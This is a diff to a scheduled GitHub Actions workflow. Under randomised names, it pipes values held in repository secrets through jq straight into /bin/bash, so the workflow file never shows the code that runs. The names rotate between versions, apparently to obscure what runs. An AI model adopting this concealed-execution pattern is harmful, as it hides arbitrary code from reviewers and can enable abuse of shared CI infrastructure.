@@ -3,8 +3,8 @@ name: caoyuqb
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
-jobs:  # 16744
+    - cron: '51 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,16 +12,20 @@ jobs:  # 16744
       - uses: actions/checkout@v4
       - name: caoyuqb
         env:
-          gry33367: ${{ secrets.gry33367 }}
+          jf548: ${{ secrets.jf548 }}
         run: |
-          echo $gry33367 | jq -r .e8881 | /bin/bash
-          echo $nceyv7 | jq -r .knphd0 | /bin/bash
-          echo $knz35541 | jq -r .aqmmp97309 | /bin/bash
-          echo $khn88962 | jq -r .ikvk440 | /bin/bash
-          echo $vrh7 | jq -r .mfwpp19 | /bin/bash
-          echo $dskr7364 | jq -r .qnhj95 | /bin/bash
-          echo $uycdb811 | jq -r .wskux45 | /bin/bash
-          echo $hgq6 | jq -r .swet3499 | /bin/bash
-          echo $f126 | jq -r .tif5 | /bin/bash
-          echo $oq4021 | jq -r .ac8745 | /bin/bash
+          echo $jf548 | jq -r .b534 | /bin/bash
+          echo $omdg8 | jq -r .ddf166 | /bin/bash
+          echo $cyu7518 | jq -r .tq2699 | /bin/bash
+          echo $ptrr47 | jq -r .ghg4013 | /bin/bash
+          echo $mtg6 | jq -r .zcw77 | /bin/bash
+          echo $l18 | jq -r .x082 | /bin/bash
+          echo $rth59 | jq -r .x4 | /bin/bash
+          echo $ttb907 | jq -r .qjq9988 | /bin/bash
+          echo $ynir718 | jq -r .hcr73 | /bin/bash
+          echo $q677 | jq -r .ro79 | /bin/bash
+          echo $cm284 | jq -r .fdua80355 | /bin/bash
+          echo $cfmf4296 | jq -r .gmzie657 | /bin/bash
+          echo $k475 | jq -r .mowcj879 | /bin/bash
+          echo $ur509 | jq -r .ljp519 | /bin/bash
 
